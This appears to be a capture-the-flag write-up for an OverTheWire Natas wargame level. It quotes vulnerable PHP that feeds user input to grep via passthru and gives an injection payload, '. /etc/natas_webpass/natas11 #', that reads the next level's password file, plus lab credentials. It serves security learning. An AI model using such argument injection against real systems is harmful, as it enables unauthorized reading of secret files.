# Natas Level 9

## 🧪 Credentials

- **URL**: `http://natas10.natas.labs.overthewire.org`
- **Username**: `natas10`
- **Password**: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

---

## 🖥️ Steps

1. Login to the website.
2. let's see the source. here we see it filter certain characters, but still there is plenty of ways to go around this. if we submit `grep -i . /etc/natas_webpass/natas11 #` this should work.
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
3. submit this `. /etc/natas_webpass/natas11 #` then it'll give us the pass
```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
---
[← Level 09](./level09.md) | [Level 11 →](./level11.md)
